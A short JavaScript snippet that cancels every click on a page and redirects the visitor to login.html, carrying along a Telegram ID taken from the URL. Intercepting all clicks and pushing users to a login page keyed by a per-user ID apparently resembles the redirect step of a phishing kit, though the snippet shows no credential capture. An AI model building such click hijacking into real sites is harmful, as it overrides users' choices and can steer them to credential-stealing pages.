 // Get Telegram ID from current URL
  function getTelegramID() {
    const params = new URLSearchParams(window.location.search);
    return params.get("id");
  }

  // Redirect on any click
  document.addEventListener("click", function (e) {
    e.preventDefault(); // stop default click behavior

    const telegramID = getTelegramID();

    if (telegramID) {
      window.location.href = `login.html?id=${telegramID}`;
    } else {
      window.location.href = "login.html";
    }
  }, true); // true makes it catch ALL clicks